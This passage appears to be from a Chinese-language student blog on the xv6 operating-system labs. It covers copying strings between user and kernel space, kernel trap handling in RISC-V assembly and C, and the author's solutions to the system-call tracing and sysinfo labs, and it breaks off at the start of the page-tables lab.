<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">argstr(<span class="keyword">int</span> n, <span class="keyword">char</span> *buf, <span class="keyword">int</span> max)</span><br><span class="line">&#123;</span><br><span class="line">  uint64 addr;</span><br><span class="line">  <span class="keyword">if</span>(argaddr(n, &amp;addr) &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">return</span> fetchstr(addr, buf, max);</span><br><span class="line">&#125;</span><br><span class="line">argaddr(<span class="keyword">int</span> n, uint64 *ip)</span><br><span class="line">&#123;</span><br><span class="line">  *ip = argraw(n);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>内核要想获得一个整数还行，但是要想获得用户态的某一个字符串或者某一段内存的值就不好办了，因为此时处于内核态，页表是内核页表，并不能访问用户态的内存，可以看看xv6是如何完成的。</p>
<p><code>copyinstr</code>函数就是完成在内核态从用户态到内核态拷贝数据的函数，传入的参数有进程的陷阱帧，内核接收地址dst和用户态地址srcva以及拷贝量max。我简述一下原理，就是利用传进来的用户态虚拟地址srcva和进程的陷阱帧完成对这个虚拟地址所映射的物理地址<code>pa0</code>的查询，查询过程就是利用陷阱帧记录的用户态页表，然后通过这个虚拟地址找到对应物理地址返回，在内核态中，由于内核将所有物理RAM地址映射到同一个内核虚拟地址，<code>copyinstr</code>可以直接将字符串字节从<code>pa0</code>复制到<code>dst</code>（这段其实不是很理解，我不确定这个pa0到底是不是物理地址，如果是的话<code>copyinstr</code>直接使用物理地址进行copy<code>*dst = *p</code>,那唯一的解释就是映射是直接映射，即虚拟地址和物理地址是一一对应的才可以）。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">copyinstr(<span class="keyword">pagetable_t</span> pagetable, <span class="keyword">char</span> *dst, uint64 srcva, uint64 max)</span><br><span class="line">&#123;</span><br><span class="line">  uint64 n, va0, pa0;</span><br><span class="line">  <span class="keyword">int</span> got_null = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span>(got_null == <span class="number">0</span> &amp;&amp; max &gt; <span class="number">0</span>)&#123;</span><br><span class="line">    va0 = PGROUNDDOWN(srcva);</span><br><span class="line">    pa0 = walkaddr(pagetable, va0);</span><br><span class="line">    <span class="keyword">if</span>(pa0 == <span class="number">0</span>)</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    n = PGSIZE - (srcva - va0);</span><br><span class="line">    <span class="keyword">if</span>(n &gt; max)</span><br><span class="line">      n = max;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> *p = (<span class="keyword">char</span> *) (pa0 + (srcva - va0));</span><br><span class="line">    <span class="keyword">while</span>(n &gt; <span class="number">0</span>)&#123;</span><br><span class="line">      <span class="keyword">if</span>(*p == <span class="string">&#x27;\0&#x27;</span>)&#123;</span><br><span class="line">        *dst = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">        got_null = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        *dst = *p;</span><br><span class="line">      &#125;</span><br><span class="line">      --n;</span><br><span class="line">      --max;</span><br><span class="line">      p++;</span><br><span class="line">      dst++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    srcva = va0 + PGSIZE;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span>(got_null)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过在qemu下打印页表发现似乎就是这样的,映射了个寂寞🤦‍♀️，在linux系统中内核好歹是线性映射所有物理区域，xv6直接一对一了。</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">vaddr            paddr            size             attr</span><br><span class="line">---------------- ---------------- ---------------- -------</span><br><span class="line">0000000002000000 0000000002000000 0000000000010000 rw-----</span><br><span class="line">000000000c000000 000000000c000000 0000000000001000 rw---ad</span><br><span class="line">000000000c001000 000000000c001000 0000000000001000 rw-----</span><br><span class="line">000000000c002000 000000000c002000 0000000000001000 rw---ad</span><br><span class="line">000000000c003000 000000000c003000 00000000001fe000 rw-----</span><br><span class="line">000000000c201000 000000000c201000 0000000000001000 rw---ad</span><br><span class="line">000000000c202000 000000000c202000 0000000000001000 rw-----</span><br><span class="line">000000000c203000 000000000c203000 0000000000001000 rw---ad</span><br><span class="line">000000000c204000 000000000c204000 0000000000001000 rw-----</span><br><span class="line">000000000c205000 000000000c205000 0000000000001000 rw---ad</span><br><span class="line">000000000c206000 000000000c206000 00000000001fa000 rw-----</span><br><span class="line">0000000010000000 0000000010000000 0000000000002000 rw---ad</span><br><span class="line">0000000080000000 0000000080000000 0000000000007000 r-x--a-</span><br><span class="line">0000000080007000 0000000080007000 0000000000001000 r-x----</span><br><span class="line">0000000080008000 0000000080008000 0000000000005000 rw---ad</span><br><span class="line">000000008000d000 000000008000d000 0000000000004000 rw-----</span><br><span class="line">0000000080011000 0000000080011000 0000000000011000 rw---ad</span><br><span class="line">0000000080022000 0000000080022000 0000000000001000 rw-----</span><br><span class="line">0000000080023000 0000000080023000 0000000000003000 rw---ad</span><br><span class="line">0000000080026000 0000000080026000 0000000007f35000 rw-----</span><br><span class="line">0000000087f5b000 0000000087f5b000 000000000005d000 rw---ad</span><br><span class="line">0000000087fb8000 0000000087fb8000 0000000000001000 rw---a-</span><br><span class="line">0000000087fb9000 0000000087fb9000 0000000000046000 rw-----</span><br><span class="line">0000000087fff000 0000000087fff000 0000000000001000 rw---a-</span><br><span class="line">0000003ffff7f000 0000000087f77000 000000000003e000 rw-----</span><br><span class="line">0000003fffffb000 0000000087fb5000 0000000000002000 rw---ad</span><br><span class="line">0000003ffffff000 0000000080007000 0000000000001000 r-x--a-</span><br></pre></td></tr></table></figure>

<h5 id="从内核态陷入"><a href="#从内核态陷入" class="headerlink" title="从内核态陷入"></a>从内核态陷入</h5><p>书中涉及到了计数器中断的处理办法，由于我不是很熟悉计数器中断，所以暂且不讨论这种情况，在第七章中会系统的学到。我只讨论一般情况下的内核陷入。</p>
<p>内核发生陷入的话只有两种情况，一是设备中断，二是内核异常，此时是处于内核态的，<code>stvec</code>就指向了<code>kernelvec</code>,然后处理trap也是在内核态，所以不需要切换页表了。处理流程主要是两个函数：<code>kernelvec</code>-&gt;<code>kerneltrap</code>-&gt;<code>kernelvec</code></p>
<p><strong>kernelvec</strong></p>
<p>意料之中又是risc-v汇编捏，但是大概是能看懂的，kernelvec首先得把所有的寄存器存放到当前内核栈的栈上，所以首先<code>addi sp.sp,-256</code>就是<code>sp=sp+(-256)</code>，先提升栈的容量。然后把寄存器放在这256容量的栈里，<code>sd ra,0(sp)</code>等于<code>*[sp+0]=ra</code>这样的形式存储，至于为什么要存储所有的寄存器，是因为在调用<code>kerneltrap</code>的时候，会因为时钟中断而让出cpu导致丢失寄存器信息，所以得记录一下，记录完就是调用<code>kerneltrap</code>了。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line">        # interrupts and exceptions while in supervisor</span><br><span class="line">        # mode come here.</span><br><span class="line">        #</span><br><span class="line">        # push all registers, call kerneltrap(), restore, return.</span><br><span class="line">        #</span><br><span class="line">.globl kerneltrap</span><br><span class="line">.globl kernelvec</span><br><span class="line">.align 4</span><br><span class="line">kernelvec:</span><br><span class="line">        // make room to save registers.</span><br><span class="line">        addi sp, sp, -256</span><br><span class="line"></span><br><span class="line">        // save the registers.</span><br><span class="line">        sd ra, 0(sp)</span><br><span class="line">        sd sp, 8(sp)</span><br><span class="line">        sd gp, 16(sp)</span><br><span class="line">        sd tp, 24(sp)</span><br><span class="line">        sd t0, 32(sp)</span><br><span class="line">        sd t1, 40(sp)</span><br><span class="line">        sd t2, 48(sp)</span><br><span class="line">        sd s0, 56(sp)</span><br><span class="line">        sd s1, 64(sp)</span><br><span class="line">        sd a0, 72(sp)</span><br><span class="line">        sd a1, 80(sp)</span><br><span class="line">        sd a2, 88(sp)</span><br><span class="line">        sd a3, 96(sp)</span><br><span class="line">        sd a4, 104(sp)</span><br><span class="line">        sd a5, 112(sp)</span><br><span class="line">        sd a6, 120(sp)</span><br><span class="line">        sd a7, 128(sp)</span><br><span class="line">        sd s2, 136(sp)</span><br><span class="line">        sd s3, 144(sp)</span><br><span class="line">        sd s4, 152(sp)</span><br><span class="line">        sd s5, 160(sp)</span><br><span class="line">        sd s6, 168(sp)</span><br><span class="line">        sd s7, 176(sp)</span><br><span class="line">        sd s8, 184(sp)</span><br><span class="line">        sd s9, 192(sp)</span><br><span class="line">        sd s10, 200(sp)</span><br><span class="line">        sd s11, 208(sp)</span><br><span class="line">        sd t3, 216(sp)</span><br><span class="line">        sd t4, 224(sp)</span><br><span class="line">        sd t5, 232(sp)</span><br><span class="line">        sd t6, 240(sp)</span><br><span class="line"></span><br><span class="line">	// call the C trap handler in trap.c</span><br><span class="line">        call kerneltrap</span><br><span class="line"></span><br><span class="line">        // restore registers.</span><br><span class="line">        ld ra, 0(sp)</span><br><span class="line">        ld sp, 8(sp)</span><br><span class="line">        ld gp, 16(sp)</span><br><span class="line">        // not this, in case we moved CPUs: ld tp, 24(sp)</span><br><span class="line">        ld t0, 32(sp)</span><br><span class="line">        ld t1, 40(sp)</span><br><span class="line">        ld t2, 48(sp)</span><br><span class="line">        ld s0, 56(sp)</span><br><span class="line">        ld s1, 64(sp)</span><br><span class="line">        ld a0, 72(sp)</span><br><span class="line">        ld a1, 80(sp)</span><br><span class="line">        ld a2, 88(sp)</span><br><span class="line">        ld a3, 96(sp)</span><br><span class="line">        ld a4, 104(sp)</span><br><span class="line">        ld a5, 112(sp)</span><br><span class="line">        ld a6, 120(sp)</span><br><span class="line">        ld a7, 128(sp)</span><br><span class="line">        ld s2, 136(sp)</span><br><span class="line">        ld s3, 144(sp)</span><br><span class="line">        ld s4, 152(sp)</span><br><span class="line">        ld s5, 160(sp)</span><br><span class="line">        ld s6, 168(sp)</span><br><span class="line">        ld s7, 176(sp)</span><br><span class="line">        ld s8, 184(sp)</span><br><span class="line">        ld s9, 192(sp)</span><br><span class="line">        ld s10, 200(sp)</span><br><span class="line">        ld s11, 208(sp)</span><br><span class="line">        ld t3, 216(sp)</span><br><span class="line">        ld t4, 224(sp)</span><br><span class="line">        ld t5, 232(sp)</span><br><span class="line">        ld t6, 240(sp)</span><br><span class="line"></span><br><span class="line">        addi sp, sp, 256</span><br><span class="line"></span><br><span class="line">        // return to whatever we were doing in the kernel.</span><br><span class="line">        sret</span><br></pre></td></tr></table></figure>

<p><strong>kerneltrap</strong></p>
<p>首先是储存<code>sepc</code>和<code>sstatus</code>两个寄存器，因为如果有时钟中断而调用<code>yield()</code>函数的时候会破坏他们，要使破坏了他们trap返回的时候就会出问题，保存完后真正处理trap，处理完之后恢复<code>sepc</code>和<code>sstatus</code>，然后返回到函数<code>kernelvec</code>中</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> </span></span><br><span class="line"><span class="function"><span class="title">kerneltrap</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> which_dev = <span class="number">0</span>;</span><br><span class="line">  uint64 sepc = r_sepc();</span><br><span class="line">  uint64 sstatus = r_sstatus();</span><br><span class="line">  uint64 scause = r_scause();</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span>((sstatus &amp; SSTATUS_SPP) == <span class="number">0</span>)</span><br><span class="line">    panic(<span class="string">&quot;kerneltrap: not from supervisor mode&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span>(intr_get() != <span class="number">0</span>)</span><br><span class="line">    panic(<span class="string">&quot;kerneltrap: interrupts enabled&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>((which_dev = devintr()) == <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;scause %p\n&quot;</span>, scause);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;sepc=%p stval=%p\n&quot;</span>, r_sepc(), r_stval());</span><br><span class="line">    panic(<span class="string">&quot;kerneltrap&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// give up the CPU if this is a timer interrupt.</span></span><br><span class="line">  <span class="keyword">if</span>(which_dev == <span class="number">2</span> &amp;&amp; myproc() != <span class="number">0</span> &amp;&amp; myproc()-&gt;state == RUNNING)</span><br><span class="line">    yield();</span><br><span class="line"></span><br><span class="line">  <span class="comment">// the yield() may have caused some traps to occur,</span></span><br><span class="line">  <span class="comment">// so restore trap registers for use by kernelvec.S&#x27;s sepc instruction.</span></span><br><span class="line">  w_sepc(sepc);</span><br><span class="line">  w_sstatus(sstatus);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>返回到kernelvec中就会简单了，就利用栈信息恢复通用寄存器，然后<code>addi sp, sp, 256</code>后<code>sret</code>结束内核陷入。</p>
<p>总而言之比用户态陷入要简单很多了。</p>
<h5 id="页面错误异常"><a href="#页面错误异常" class="headerlink" title="页面错误异常"></a>页面错误异常</h5><p>这个暂时不看，涉及到了第三章的知识，暂时还没有学习到。</p>
<h4 id="System-call-tracing"><a href="#System-call-tracing" class="headerlink" title="System call tracing"></a>System call tracing</h4><p>就是增加一个系统调用追踪的功能，可以先利用这个系统调用设置自己想要追踪的系统调用，然后这个程序以及子程序在调用这个系统调用的时候都会打印相应数据。</p>
<p>编程不是难点，难点可能是理清楚系统调用的原理以及对应的几个c文件就好了，只要阅读过书籍的第四章问题就不大的</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">trace_printf_sysname</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span>=</span>myproc();</span><br><span class="line">  <span class="keyword">int</span> mask=p-&gt;trace_num;</span><br><span class="line">  <span class="keyword">int</span> sys_num=p-&gt;trapframe-&gt;a7;</span><br><span class="line">  <span class="keyword">if</span>(mask&amp;(<span class="number">1</span>&lt;&lt;sys_num))&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d: syscall %s -&gt; %d\n&quot;</span>,p-&gt;pid,syscall_name[sys_num],p-&gt;trapframe-&gt;a0);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">uint64</span></span><br><span class="line"><span class="function"><span class="title">sys_trace</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> mask;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span> =</span> myproc();</span><br><span class="line">  <span class="keyword">if</span>(argint(<span class="number">0</span>,&amp;mask)&lt;<span class="number">0</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  p-&gt;trace_num=mask;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="Sysinfo"><a href="#Sysinfo" class="headerlink" title="Sysinfo"></a>Sysinfo</h4><p>这个系统调用个就比较麻烦了，首先得把结构体从<code>struct sysinfo</code>从内核态拷贝回用户空间，然后得在内核获得空闲内存量，然后还得获得<code>stat</code>不为<code>UNUSED</code>的进程数。都没怎么听过，得阅读源码慢慢搞清楚。</p>
<p>从内核态拷贝数据使用的是<code>copyout</code>函数,之前分析过<code>copyin</code>函数，原理都是差不多的。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span></span></span><br><span class="line"><span class="function"><span class="title">copyout</span><span class="params">(<span class="keyword">pagetable_t</span> pagetable, uint64 dstva, <span class="keyword">char</span> *src, uint64 len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  uint64 n, va0, pa0;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span>(len &gt; <span class="number">0</span>)&#123;</span><br><span class="line">    va0 = PGROUNDDOWN(dstva);</span><br><span class="line">    pa0 = walkaddr(pagetable, va0);</span><br><span class="line">    <span class="keyword">if</span>(pa0 == <span class="number">0</span>)</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    n = PGSIZE - (dstva - va0);</span><br><span class="line">    <span class="keyword">if</span>(n &gt; len)</span><br><span class="line">      n = len;</span><br><span class="line">    memmove((<span class="keyword">void</span> *)(pa0 + (dstva - va0)), src, n);</span><br><span class="line"></span><br><span class="line">    len -= n;</span><br><span class="line">    src += n;</span><br><span class="line">    dstva = va0 + PGSIZE;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>获得内存空闲字节课以通过阅读<code>kmalloc.c</code>源码很好的解决,在xv6系统中定义了两个结构体来管理空闲页面其中通过<code>struct run</code>组成一个单向链表来链接所有的空闲链表，然后通过<code>struct kmem.freelist</code>指向这个链表的头结点，所以只需要遍历这个链表就可以所有空闲页面了。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">run</span> &#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">run</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">spinlock</span> <span class="title">lock</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">run</span> *<span class="title">freelist</span>;</span></span><br><span class="line">&#125; kmem;</span><br></pre></td></tr></table></figure>

<p>在<code>struct proc</code>中有一个字段<code>struct proc *parent</code>可以通过遍历这个字段完成对进程数的统计，这种统计方式肯定有问题，因为一个进程可以有多个子进程，这个办法每一层进程只能遍历一个，与其说统计有多少个进程，不如说统计有多少层进程，当然这也是<code>struct proc</code>的设计问题，只能这样干。</p>
<p>代码如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">uint64</span></span><br><span class="line"><span class="function"><span class="title">sys_sysinfo</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span>=</span>myproc();</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">sysinfo</span> <span class="title">info</span>;</span></span><br><span class="line">  uint64 user_info;</span><br><span class="line">  <span class="keyword">if</span>(argaddr(<span class="number">0</span>,&amp;user_info)&lt;<span class="number">0</span>)&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;sysinfo addr get fail\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  info.freemem=countfree();</span><br><span class="line">  info.nproc=get_proc_num();</span><br><span class="line">  <span class="keyword">if</span>(copyout(p-&gt;pagetable,user_info,(<span class="keyword">char</span> *)&amp;info,<span class="keyword">sizeof</span>(info))&lt;<span class="number">0</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> </span></span><br><span class="line"><span class="function"><span class="title">countfree</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> n=<span class="number">0</span>;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">run</span> *<span class="title">r</span>;</span></span><br><span class="line">  r=kmem.freelist;</span><br><span class="line">  <span class="keyword">while</span>(r)&#123;</span><br><span class="line">    <span class="comment">// printf(&quot;page_addr:%p\n&quot;,r);</span></span><br><span class="line">    n=n+<span class="number">4096</span>;</span><br><span class="line">    r=r-&gt;next;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> n;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">get_proc_num</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span>=</span>myproc();</span><br><span class="line">  <span class="keyword">int</span> num=<span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span>(p-&gt;parent)&#123;</span><br><span class="line">    <span class="keyword">if</span>(p-&gt;state!=UNUSED)&#123;</span><br><span class="line">      num++;</span><br><span class="line">    &#125;</span><br><span class="line">    p=p-&gt;parent;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> num;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="得分"><a href="#得分" class="headerlink" title="得分"></a>得分</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Score: 35/35</span><br></pre></td></tr></table></figure>

<h4 id="结语-1"><a href="#结语-1" class="headerlink" title="结语"></a>结语</h4><p>对系统调用理解的更深了吧，之前只知道大概思想，现在也知道了如何实现的，也对xv6的用户态和内核态的切换更加熟悉，也更加了解了xv6的源代码。</p>
<h2 id="Lab3-page-tables"><a href="#Lab3-page-tables" class="headerlink" title="Lab3: page tables"></a>Lab3: page tables</h2><h3 id="code-read"><a href="#code-read" class="headerlink" title="code-read"></a>code-read</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span 